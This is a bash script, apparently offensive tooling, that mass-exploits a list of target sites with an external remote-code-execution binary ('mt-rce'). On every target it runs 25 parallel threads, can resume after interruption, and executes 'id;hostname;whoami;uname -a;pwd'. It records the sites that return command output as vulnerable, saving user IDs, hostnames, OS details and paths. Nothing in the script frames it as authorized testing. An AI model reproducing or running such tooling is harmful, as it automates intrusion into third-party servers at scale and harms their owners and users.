#!/bin/bash
# mass-scan.sh - Multi Thread + Resume + Auto Pause
# Usage: ./mass-scan.sh -t targets.txt [-o output_dir] [-r]

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

THREADS=25
TIMEOUT=15
MAX_WAIT=45
BINARY="./mt-rce"
RESUME_MODE=0
OUTPUT_DIR_OVERRIDE=""

while getopts "t:o:r" opt; do
    case $opt in
        t) TARGETS_FILE="$OPTARG" ;;
        o) OUTPUT_DIR_OVERRIDE="$OPTARG" ;;
        r) RESUME_MODE=1 ;;
        *) echo "Usage: $0 -t <targets.txt> [-o <output_dir>] [-r]" && exit 1 ;;
    esac
done

extract_domain() {
    local url="$1"
    url=$(echo "$url" | sed -E 's|^https?://||')
    url=$(echo "$url" | cut -d'/' -f1)
    url=$(echo "$url" | cut -d':' -f1)
    echo "$url" | tr '.' '_' | tr ':' '_'
}

wait_for_network() {
    while true; do
        if ping -c 1 -W 2 8.8.8.8 &>/dev/null; then return 0; fi
        if curl -s --connect-timeout 3 http://google.com &>/dev/null; then return 0; fi
        echo -e "${YELLOW}[!] Menunggu jaringan...${NC}"
        sleep 5
    done
}

cleanup() {
    echo -e "${YELLOW}[!] Menyimpan progress...${NC}"
    if [ -n "$OUTPUT_DIR" ]; then
        local last=$(cat "$OUTPUT_DIR/tmp/counter" 2>/dev/null || echo 0)
        echo "$last" > "$OUTPUT_DIR/sampai-mana.txt"
    fi
    exit 0
}
trap cleanup SIGINT SIGTERM

# ============ MAIN ============
if [ ! -f "$BINARY" ]; then
    echo "mt-rce binary not found"; exit 1
fi

if [ -z "$TARGETS_FILE" ] || [ ! -f "$TARGETS_FILE" ]; then
    echo "Target file required (-t)"; exit 1
fi

# Tentukan OUTPUT_DIR
if [ -n "$OUTPUT_DIR_OVERRIDE" ]; then
    OUTPUT_DIR="$OUTPUT_DIR_OVERRIDE"
    mkdir -p "$OUTPUT_DIR/vulnerable" "$OUTPUT_DIR/tmp"
    if [ ! -f "$OUTPUT_DIR/targets_clean.txt" ]; then
        tr -d '\r' < "$TARGETS_FILE" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' > "$OUTPUT_DIR/targets_clean.txt"
    fi
    if [ ! -f "$OUTPUT_DIR/targets.txt" ]; then
        cp "$TARGETS_FILE" "$OUTPUT_DIR/targets.txt"
    fi
else
    BASE_DIR=$(basename "$TARGETS_FILE" .txt)
    OUTPUT_DIR="${BASE_DIR}/output_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR/vulnerable" "$OUTPUT_DIR/tmp"
    tr -d '\r' < "$TARGETS_FILE" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' > "$OUTPUT_DIR/targets_clean.txt"
    cp "$TARGETS_FILE" "$OUTPUT_DIR/targets.txt"
fi

TOTAL=$(wc -l < "$OUTPUT_DIR/targets_clean.txt")
if [ -f "$OUTPUT_DIR/sampai-mana.txt" ] && [ $RESUME_MODE -eq 1 ]; then
    START_FROM=$(cat "$OUTPUT_DIR/sampai-mana.txt")
else
    START_FROM=0
fi

echo "$START_FROM" > "$OUTPUT_DIR/tmp/counter"
echo "0" > "$OUTPUT_DIR/tmp/scanned"
echo "0" > "$OUTPUT_DIR/tmp/vuln"
echo "0" > "$OUTPUT_DIR/tmp/skip"

if [ ! -f "$OUTPUT_DIR/results.csv" ]; then
    echo "STATUS|ENDPOINT_URL|USER_ID|HOSTNAME|OS_INFO|PWD" > "$OUTPUT_DIR/results.csv"
fi

echo "[*] Total: $TOTAL | Threads: $THREADS | Output: $OUTPUT_DIR"

scan_target() {
    local target="$1"
    local num="$2"
    local out="$OUTPUT_DIR"
    local ts="$TIMEOUT" mw="$MAX_WAIT" bin="$BINARY"

    echo "$num" > "$out/tmp/counter"
    local scanned=$(cat "$out/tmp/scanned"); echo $((scanned+1)) > "$out/tmp/scanned"

    local output
    output=$(timeout "$mw" "$bin" -u "$target" -c "id;hostname;whoami;uname -a;pwd" -t "$ts" 2>&1)
    local exit_code=$?

    if [ $((num % 10)) -eq 0 ]; then echo "$num" > "$out/sampai-mana.txt"; fi

    if [ $exit_code -eq 124 ]; then
        echo "$num|TIMEOUT|$target|N/A|N/A|N/A|N/A" >> "$out/results.tmp"
        echo -e "${YELLOW}[$num/$TOTAL] SKIP: $target${NC}"
    elif echo "$output" | grep -q "uid="; then
        local endpoint_url=$(echo "$output" | grep -oP '\[0\] \K(https?://[^\s]+)' | head -1)
        [ -z "$endpoint_url" ] && endpoint_url="$target"
        local cmd_output=$(echo "$output" | sed -n '/Executing:/,$p' | tail -n +2)
        local user_id=$(echo "$cmd_output" | grep -oP 'uid=\d+\(\w+\)[^)]*\)' | head -1 | tr -d '\n\r')
        local hostname=$(echo "$cmd_output" | grep -v 'uid=' | grep -v 'Executing' | grep -v '^\[' | grep -v '^$' | grep -v 'Linux' | head -1 | tr -d '\n\r')
        local os_info=$(echo "$cmd_output" | grep -i 'Linux\|GNU/Linux' | head -1 | tr -d '\n\r')
        local pwd=$(echo "$cmd_output" | grep -oP '^/[\w/]+' | head -1 | tr -d '\n\r')
        local domain_name=$(extract_domain "$endpoint_url")

        echo "$num|VULNERABLE|$endpoint_url|$user_id|$hostname|$os_info|$pwd" >> "$out/results.tmp"
        echo "$endpoint_url" >> "$out/vulnerable_urls.txt"
        cat > "$out/vulnerable/${domain_name}.txt" << EOF
VULNERABLE TARGET DETAIL
TARGET: $target
ENDPOINT: $endpoint_url
USER: $user_id
HOSTNAME: $hostname
OS: $os_info
PWD: $pwd
OUTPUT:
$cmd_output
EOF
        echo -e "${GREEN}[$num/$TOTAL] VULN: $endpoint_url${NC}"
    else
        echo "$num|NOT_VULNERABLE|$target|N/A|N/A|N/A|N/A" >> "$out/results.tmp"
        echo -e "${RED}[$num/$TOTAL] NOT: $target${NC}"
    fi
}

export -f scan_target extract_domain wait_for_network
export RED GREEN YELLOW CYAN NC BINARY TIMEOUT MAX_WAIT OUTPUT_DIR TOTAL

> "$OUTPUT_DIR/results.tmp"
local line_num=$START_FROM
local running=0

while IFS= read -r domain; do
    line_num=$((line_num+1))
    wait_for_network
    scan_target "$domain" "$line_num" &
    running=$((running+1))
    [ $running -ge $THREADS ] && { wait -n; running=$((running-1)); }
done < <(tail -n +$((START_FROM+1)) "$OUTPUT_DIR/targets_clean.txt")
wait

if [ -f "$OUTPUT_DIR/results.tmp" ]; then
    sort -t'|' -k1 -n "$OUTPUT_DIR/results.tmp" | cut -d'|' -f2- >> "$OUTPUT_DIR/results.csv"
    rm "$OUTPUT_DIR/results.tmp"
fi

echo "$line_num" > "$OUTPUT_DIR/sampai-mana.txt"
echo "SCAN COMPLETE"